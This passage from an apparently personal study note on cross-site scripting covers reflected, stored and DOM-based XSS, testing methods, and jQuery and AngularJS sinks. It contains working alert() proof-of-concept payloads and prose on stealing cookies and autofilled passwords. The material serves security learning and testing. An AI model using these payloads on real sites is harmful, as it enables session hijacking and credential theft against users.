input in the URL</span></p><p><font color=green><span>Example</span></font><span> </span><a href='https://insecure.com/search?term=All+fine' target='_blank' class='url'>https://insecure.com/search?term=All+fine</a></p><p><span>				</span><code>&lt;p&gt;You searched for: All fine.&lt;/p&gt;</code></p><p><span>The application echoes the supplied search in the response and does not perform any other processing of the data. So an attacker can easily construct an attack</span><span>	</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">https://insecure.com/search?term=&gt;&lt;script&gt;/*+bad+stuff/&lt;/script&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span> &nbsp; <span class="cm-tab" role="presentation" cm-text="	"> </span>&lt;p&gt; You searched for: &lt;script&gt;/*+bad+stuff/&lt;/script&gt; &lt;/p&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 115px;"></div><div class="CodeMirror-gutters" style="display: none; height: 115px;"></div></div></div></pre><p><span> If the user visits the URL created by the attacker, then the attackers script executes in the users browser. The script can carry out any action.</span></p><hr /><h5 id='find-and-test-1'><span>Find and Test</span></h5><p><span>Use Burp Suites web vulnerability scanner or manually test:</span></p><ol start='' ><li><p><strong><span>Test every entry point</span></strong><span> </span></p><p><span>Test separately every entry point for the data within the apps HTTP requests</span></p></li><li><p><strong><span>Submit random alphanumeric values</span></strong></p><p><span>For each entry point, submit a unique random values and determine whether the value is reflected in the response</span></p></li><li><p><strong><span>Determine the reflection context</span></strong></p><p><span>for each location within the response where the random value is reflected, determine its context. might be in-between HTML tags, within a tag attribute, quoted, a JavaScript string, etc.</span></p></li><li><p><strong><span>Test a candidate payload</span></strong></p><p><span>Based on the context of the reflection, test an initial XSS payload that will trigger JavaScript execution. Easiest way to test is to use Burp Suites repeater.</span></p></li><li><p><strong><span>Test alternative payloads</span></strong></p></li><li><p><strong><span>Test the attack in a browser</span></strong></p><p><span>If you succeed in finding a payload, transfer the attack to a real browser and see if the injected JavaScript is executed. Modify the request in Burp Suites intercept view.</span></p></li></ol><hr /><p>&nbsp;</p><h4 id='stored-xss'><span>Stored XSS</span></h4><p>⬛️◽️◼️</p><p><a href='xss.html'><span>Top</span></a></p><p><span>also known as Second-order or persistent XSS</span></p><p><span>where the malicious script comes from the websites database.</span></p><p><span>arises when an application recieves data from an untrusted source and includes that data within its later HTTP responses</span></p><p><span>Suppose a website allows users to submit comments on blog posts.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">POST /post/comment HTTP/1.1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host: vulnerable-site.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Content-Length: 100</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">postId=5&amp;comment=Thanks+for+the+info.&amp;name=ED+Liess&amp;email=ed%40email.com</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 207px;"></div><div class="CodeMirror-gutters" style="display: none; height: 207px;"></div></div></div></pre><p><span>Any user who visits the blog post will see</span></p><p><code>&lt;p&gt; Thanks for the info &lt;/p&gt;</code></p><p><span>Assuming the application does not perform any other processing of data, an attacker can submit a malicious comment</span></p><p><code>&lt;script&gt;/* Bad here..*/&lt;/script&gt;</code></p><p><span>The request could be url encoded</span></p><p><span>comment=</span><font color=red><span>%3Cscript%3E%2F</span><em><span>%2BBad%2Bhere...%2B</span></em><span>%2F%3C%2Fscript%3E</span></font></p><p><span>Any user who visits the post will now recieve the script within the applications response</span></p><hr /><h5 id='find-and-test-2'><span>Find and Test</span></h5><p><span>Use Burp Suites web vulnerability scanner or manually test:</span></p><p><span>Manual testing for stored XSS can be difficult. You would need to test all relevant entry points, and all exit points.</span></p><p><strong><span>Entry Points</span></strong></p><ul><li><span>Parameters or other data within the URL query string and message body</span></li><li><span>URL file path</span></li><li><span>HTTP request headers, not exploitable with relfected XSS</span></li><li><span>any out-of-band routes in which an attacker can deliver data into the application.</span></li></ul><p><strong><span>Exit Points</span></strong><span>- all possible HTTP responses that are returned to any kind of app user. Locate the links between entry and exit points, where data submitted to an entry point is emitted from an exit point.</span></p><p><span>A more realistic approach is to work systematically through the data entry points, submitting a specific value into each one, and monitoring the application&#39;s responses to detect cases where the submitted value appears.</span></p><hr /><p>&nbsp;</p><h4 id='dom-based-xss'><span>DOM-based XSS</span></h4><p>⬛️◽️◼️</p><p><a href='xss.html'><span>Top</span></a></p><p><span>where the vulnerability exists in the client-side code rather than the server-side code.</span></p><p><span>When JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as </span><font color=blue><span>eval() </span></font><span>or </span><font color=blue><span>innerHTML</span></font><span>. </span></p><p><span>The most common source for DOM XSS is the URL, which is typically accessed with the </span><font color=blue><span>window.location</span></font><span> object. an attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Usually in query string (?)</span></p><p><font color=green><span>Example</span></font></p><p><span>some application uses some JavaScript to read the value from an input field and write that value to an element within the HTML</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">var search = document.getElementById('search').value;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">var results = document.getElementById('results');</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">results.innerHTML = 'Search: ' + search;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 115px;"></div><div class="CodeMirror-gutters" style="display: none; height: 115px;"></div></div></div></pre><p><span>If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:</span></p><p><span>You searched for: </span><code>&lt;img src=1 onerror=&#39;/* Bad stuff */&#39;&gt;</code></p><hr /><h5 id='find-and-test-3'><span>Find and Test</span></h5><p><span>Use Burp Suites web vulnerability scanner or manually test:</span></p><p><span>To test for DOM-based cross-site scripting manually, </span><strong><span>you generally need to use a browser with developer tools</span></strong><span>, such as Chrome. You need to work through each available source in turn, and test each one individually.</span></p><figure><table><thead><tr><th><span>Main Sinks for DOM-XSS</span></th></tr></thead><tbody><tr><td><span>document.write()</span><br><span>document.writeln()</span><br><span>document.domain</span><br><span>element.innerHTML</span><br><span>element.outerHTML</span><br><span>element.insertAdjacentHTML</span><br><span>element.onevent</span></td></tr></tbody></table></figure><p>&nbsp;</p><p><strong><span>Testing HTML Sinks</span></strong></p><p><span>	</span><span>place random alphanumeric string into the source (such as </span><font color=blue><span>location.search</span></font><span>), then use developer tools to inspect the HTML and find where your string appears (view source will not work).</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">https://www.site.com/submit.html?email=[random letters]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 46px;"></div><div class="CodeMirror-gutters" style="display: none; height: 46px;"></div></div></div></pre><p><span>	</span><span>For each location where your string appears within the DOM you need to identify the context. Based on the context you need to refine your input to see how it is processed. For example if your string appears in double quoted attribute then try to inject double quotes.</span></p><p>&nbsp;</p><p><strong><span>Testing JavaScript execution Sinks</span></strong></p><p><span>	</span><span>Your input will not appear anywhere within the DOM, you cannot search for it. Instead you need to use the JavaScript debugger to determine whether and how your input is sent to the sink</span></p><p><span>	</span><span>for each potential source such as </span><font color=blue><span>location</span></font><span> you first need to find cases within the pages JavaScript code where the source is being refrenced (developer tools)</span></p><p><span>	</span><span>Once you found where the source is being read, use the JavaScript debugger to add a break point and follow how the sources value is being used.</span></p><p><span>Using Burp&#39;s embedded browser, you can use the built in DOM invader extention that will automate the manual testing process.</span></p><hr /><p>&nbsp;</p><h5 id='exploiting-dom-with-different-sources-and-sinks'><span>Exploiting DOM with different sources and Sinks</span></h5><p><span>DOM-based XSS vulnerabilities arise when a website has an executable path via which data can propagate from source to sink.</span></p><p><span>Different sources and sinks have different properties and behavior that can effect exploitability.</span></p><p>&nbsp;</p><p><strong><span>Different varieties of Sink</span></strong></p><ol start='' ><li><font color=blue><span>document.write </span></font><span> works with the script element.</span></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">document.write('...&lt;script&gt;alert(document.domain)&lt;/script&gt;...');</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 69px;"></div><div class="CodeMirror-gutters" style="display: none; height: 69px;"></div></div></div></pre><p><span>some sitututaions the content that is written to </span><code>document.write</code><span> includes some surrounding context that you need to take account of. you might need to close some elements before using your payload.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"&gt;&lt;svg onload=alert(1)&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#SVG is a container for graphics, drawing graphic images (2D)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 69px;"></div><div class="CodeMirror-gutters" style="display: none; height: 69px;"></div></div></div></pre><p>&nbsp;</p><ol start='2' ><li><p><span>Some surrounding context may alter the exploit needed such as </span><font color=blue><span>select</span></font><span>, you would need to close exisiting elements before using the JavaScript payload</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Open developer tools and see if there are any dangerous JavaScript extracts like storeId</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">add that dangerous storeId parameter to your URL &amp;storeId=[random#s]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Now that parameter should be listed as an option, right click and Inspect, and see the select context</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Bypass the Select element in your URL 'storeId="&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 230px;"></div><div class="CodeMirror-gutters" style="display: none; height: 230px;"></div></div></div></pre><p>&nbsp;</p></li><li><p><font color=blue><span>innerHTML</span></font><span> sink using source location.search</span></p><p><span>enter </span><code>&lt;img src=1 onerror=alert(1)&gt;</code></p></li></ol><p><span>		</span><span>the src attribute is invalid and throws and error. Then it triggers the onerror event handler</span></p><p><span>		</span><span>which then calls the alert function. </span></p><p>&nbsp;</p><h5 id='sources-and-sinks-in-third-party-dependencies'><span>Sources and sinks in third-party dependencies</span></h5><h6 id='dom-xss-in-jquery'><span>DOM XSS in JQuery</span></h6><p><span>Look out for sinks that can alter DOM elements on the page. </span></p><p><span>For </span><font color=green><span>example</span></font><span> the </span><font color=blue><span>attr()</span></font><span> function can change the DOM elements. the data is read from a user-controlled source like the URL then passed to the </span><font color=blue><span>attr()</span></font><span> function, then it may be possible to manipulate the value sent to cause XSS.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$(function() {</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">});</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 115px;"></div><div class="CodeMirror-gutters" style="display: none; height: 115px;"></div></div></div></pre><p><span>You can exploit this by modifying the URL so that the </span><font color=blue><span>location.search</span></font><span> source contains a malicious JavaScript URL. Inspect the page after adding random characters after returnURL to see if they are included in the href for back link. After the page&#39;s JavaScript applies this malicious URL to the back link&#39;s href, clicking on the back link will execute it:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">site.com/feedback?returnUrl=javascript:alert(document.domain)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 46px;"></div><div class="CodeMirror-gutters" style="display: none; height: 46px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>JQuery $ ()</span></strong></p><p><a href='xss.html'><span>Top</span></a></p><p><span>Can be used to inject malicous objects into the DOM</span></p><p><span>Websites used this selector in conjuction with </span><font color=blue><span>location.hash</span></font><span> source for animiations or autoscrolling. This behavior was often implemented using a vulnerable hashchange event handler </span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">$(window).on('hashchange', function() {</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  var element = $(location.hash);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  element[0].scrollIntoView();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">});</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 92px;"></div><div class="CodeMirror-gutters" style="display: none; height: 92px;"></div></div></div></pre><p><span>the hash is user controllable, an attacker can use </span><code>$()</code><span> to inject an XSS. This vulnerabliity has been patched, you can still find it in the wild.</span></p><p><span>to exploit: </span><code>&lt;iframe src=&quot;https://website.com#&quot; onload=&quot;this.src+=&#39;&lt;img src=1 onerror=alert(1)&gt;&#39;&quot;&gt;</code></p><p><span>	</span><span>the src attribute points to the vulnerable page with an empty hash value.</span></p><figure><table><thead><tr><th><span>Main jQuery Sinks</span></th></tr></thead><tbody><tr><td><span>add()</span><br><span>after()</span><br><span>append()</span><br><span>animate()</span><br><span>insertAfter()</span><br><span>insertBefore()</span><br><span>before()</span><br><span>html()</span><br><span>prepend()</span><br><span>replaceAll()</span><br><span>replaceWith()</span><br><span>wrap()</span><br><span>wrapInner()</span><br><span>wrapAll()</span><br><span>has()</span><br><span>constructor()</span><br><span>init()</span><br><span>index()</span><br><span>jQuery.parseHTML()</span><br><span>$.parseHTML()</span></td></tr></tbody></table></figure><p>&nbsp;</p><p><strong><span>DOM XSS in AgnularJS</span></strong></p><p><span>It may be possible to execute JavaScript without angle brackets or events. when a site uses the </span><font color=blue><span>ng-app</span></font><span> attribute on an HTML element.</span></p><p><span>AngularJS will execute JavaScript inside double curly braces.</span></p><p><code>{{$on.constructor(&#39;alert(1)&#39;)()}}</code></p><p>&nbsp;</p><h5 id='dom-xss-combined-with-reflected-and-stored-data'><span>DOM XSS combined with reflected and stored data</span></h5><p><span>In a reflected+DOM vulnerability the server processes data from the request, and echoes the data into the response. </span></p><p><span>The reflected data might be placed into JavaScript string literal, or a data item within the DOM, such as a form field</span></p><p><code>eval(&#39;var data= &quot;reflected string&quot;&#39;);</code></p><p><span>Websites may also store data on the server and reflect it elsewhere. The server recieves data from one request, stores it, and then includes the data in a later response. </span></p><p><code>element.innerHTML = comment.author</code></p><hr /><p>&nbsp;</p><h3 id='ways-of-exploiting-xss'><span>Ways of Exploiting XSS</span></h3><p><a href='xss.html'><span>Top</span></a></p><p><a href='https://portswigger.net/web-security/cross-site-scripting/exploiting' target='_blank' class='url'>https://portswigger.net/web-security/cross-site-scripting/exploiting</a></p><p>⬛️◽️◼️</p><h4 id='stealing-cookies'><span>Stealing Cookies</span></h4><p><span>Most apps use cookies for session handling. You can exploit XSS to send victims cookies to your own domain, then manually inject the cookies into your browser. </span></p><p><strong><span>Limitations</span></strong></p><ul><li><span>victim cannot be logged in</span></li><li><span>JavaScript may hide cookies with HttpOnly</span></li><li><span>Sessions might be locked with additional factors like IP address</span></li><li><span>Session might time out before you are able to hijack it</span></li></ul><hr /><h4 id='capture-passwords'><span>Capture Passwords</span></h4><p><span>Many users have password managers that autofill their passwords. You can take advantage of this by creating password input, reading out the auto-filled password then sending it to your own domain.</span></p><p><span>The primary disadvantage is that it only works on users that use a password manager with the autofill functionality.</span></p><hr /><h4 id='xss-to-perform-csrf'><span>XSS to perform CSRF</span></h4><p><span>Anything a legitimate user can do on a website you can also do with XSS. You might be able to send a message, accept friend requests, commit a backdoor, etc.</span></p><p><span>Some websites allow logged-in users to change their email address without the need to re-enter their password. You can make it trigger this functionality to change it to a email you own, then trigger password reset. This type of exploit is cross-site request forgery (CSRF)</span></p><hr /><p>&nbsp;</p><h3 id='what-can-xss-be-used-for'><span>What can XSS be used for</span></h3><p>⬛️◽️◼️</p><ul><li><span>Impersonate or masquerade as the victim user.</span></li><li><span>Carry out any action that the user is able to perform.</span></li><li><span>Read any data that the user is able to access.</span></li><li><span>Capture the user&#39;s login credentials.</span></li><li><span>Perform virtual defacement of the web site.</span></li><li><span>Inject trojan functionality into the web site.</span></li></ul><hr /><p>&nbsp;</p><h3 